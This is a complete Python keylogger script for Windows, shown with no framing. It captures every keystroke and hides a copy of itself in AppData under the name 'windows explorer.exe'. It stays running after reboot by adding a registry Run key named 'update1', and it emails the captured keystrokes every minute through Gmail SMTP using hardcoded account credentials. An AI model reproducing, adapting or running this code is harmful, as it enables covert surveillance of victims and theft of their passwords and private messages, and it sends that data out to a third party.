#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib
import os
import shutil
import subprocess
import sys

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.mail = email
        self.passwords = password

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\windows explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update1 /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def send_mail(self, email, password, log):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, log)
        server.quit()


    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.mail, self.passwords, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def start(self):
        self.become_persistent()
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger(60, "ajaysuresh306@gmail.com", "doordie300")
my_keylogger.start()

